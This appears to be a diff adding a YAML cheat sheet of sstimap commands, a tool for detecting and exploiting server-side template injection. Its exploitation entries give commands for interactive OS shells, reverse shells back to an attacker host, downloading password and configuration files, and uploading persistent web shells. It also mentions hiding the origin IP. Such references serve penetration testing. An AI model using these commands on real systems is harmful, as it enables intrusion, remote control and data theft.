@@ -1,0 +1,102 @@
+tool: sstimap
+tags: [security, pentest, exploitation, ssti, web, vulnerability-scanner, jinja2, reconnaissance]
+
+# === DISCOVERY AND SCANNING ===
+
+actions:
+ - title: sstimap - basic url scan
+   desc: |
+     Perform an automated scan of a specific URL to detect Server-Side Template Injection (SSTI) vulnerabilities. 
+     The tool probes various parameters to identify the underlying template engine, such as Jinja2, Mako, or Twig. 
+     This is the most common entry point for testing web applications with dynamic content.
+   command: "sstimap.py -u {{url}}"
+
+ - title: sstimap - scan post request data
+   desc: |
+     Scan for vulnerabilities within the body of a POST request. 
+     This is essential for testing forms, API endpoints, and search functionalities that do not use GET parameters. 
+     The data string should contain the parameters you wish to test for injection points.
+   command: "sstimap.py -u {{url}} --data {{post_data}}"
+
+ - title: sstimap - scan with custom headers and cookies
+   desc: |
+     Include specific HTTP headers or session cookies in the scanning process. 
+     Many web applications require authentication or specific headers like 'User-Agent' or 'Authorization' to access certain routes. 
+     Providing these allows sstimap to reach protected areas that might otherwise return 401 or 403 errors.
+   command: "sstimap.py -u {{url}} --headers {{headers}} --cookies {{cookies}}"
+
+ - title: sstimap - increased detection level
+   desc: |
+     Increase the depth of the scan using the level parameter to try more complex payloads. 
+     Higher levels increase the number of tests performed per parameter, which might find bypasses for basic filters. 
+     Note that higher levels (up to 5) will increase the scan duration and the number of requests sent to the server.
+   command: "sstimap.py -u {{url}} --level {{level|2}}"
+
+ - title: sstimap - use proxy for scanning
+   desc: |
+     Route all traffic through a specified proxy, such as Burp Suite or a SOCKS5 proxy. 
+     This is useful for debugging the payloads sent by sstimap or for hiding the origin IP address. 
+     It also allows for integration with other security tools in your testing pipeline.
+   command: "sstimap.py -u {{url}} --proxy {{proxy_url|http://127.0.0.1:8080}}"
+
+# === EXPLOITATION - SHELL ACCESS ===
+
+ - title: sstimap - get interactive os shell
+   desc: |
+     Spawn an interactive operating system shell on the target server once an injection point is confirmed. 
+     This allows for direct command execution and system navigation through the vulnerable template engine. 
+     This action carries a higher risk and should only be performed on authorized targets as it alters the server's state.
+   command: "sstimap.py -u {{url}} --os-shell"
+
+ - title: sstimap - execute single os command
+   desc: |
+     Execute a single, specific operating system command on the remote target. 
+     The output of the command is returned directly to your terminal, making it ideal for quick reconnaissance. 
+     It is a stealthier alternative to spawning a full interactive shell when only specific information is needed.
+   command: "sstimap.py -u {{url}} --os-cmd {{command|id}}"
+
+ - title: sstimap - establish reverse shell
+   desc: |
+     Force the target server to initiate a connection back to your local machine. 
+     You must provide your local IP address and a port that you are listening on (e.g., via netcat). 
+     This technique is highly effective for bypassing restrictive inbound firewall rules on the target network.
+   command: "sstimap.py -u {{url}} --reverse-shell {{lhost}} {{lport}}"
+
+ - title: sstimap - engine evaluation shell
+   desc: |
+     Open an interactive shell that evaluates code directly in the template engine's base language (e.g., Python, PHP, Ruby). 
+     This is useful for inspecting the internal objects of the application or accessing environment variables. 
+     It provides a deeper level of interaction with the web application's runtime environment without executing OS commands.
+   command: "sstimap.py -u {{url}} --eval-shell"
+
+# === FILE OPERATIONS ===
+
+ - title: sstimap - download remote file
+   desc: |
+     Exfiltrate files from the target server's filesystem to your local machine. 
+     You can download sensitive configuration files, source code, or password files if the application user has sufficient permissions. 
+     Always ensure you have the correct absolute path of the file on the remote system.
+   command: "sstimap.py -u {{url}} --download {{remote_path}} {{local_path}}"
+
+ - title: sstimap - upload local file
+   desc: |
+     Upload a file from your local machine to the target server's filesystem. 
+     This is frequently used to deploy persistent web shells, scripts, or post-exploitation tools. 
+     Be careful with the remote path to avoid overwriting existing files and potentially breaking the application.
+   command: "sstimap.py -u {{url}} --upload {{local_path}} {{remote_path}}"
+
+# === ADVANCED TECHNIQUES ===
+
+ - title: sstimap - manual engine selection
+   desc: |
+     Force the tool to use a specific template engine instead of performing automated detection. 
+     This speeds up the process if you already know the backend technology from previous reconnaissance. 
+     Supported engines include Jinja2, Mako, Tornado, Smarty, Freemarker, and many others.
+   command: "sstimap.py -u {{url}} --engine {{engine_name}}"
+
+ - title: sstimap - technique selection
+   desc: |
+     Specify the exploitation technique to be used during the attack. 
+     Options include 'render' (default), 'blind', or 'code' execution styles. 
+     Restricting techniques can help in environments where certain types of feedback are blocked by a Web Application Firewall (WAF).
+   command: "sstimap.py -u {{url}} --technique {{technique|render}}"
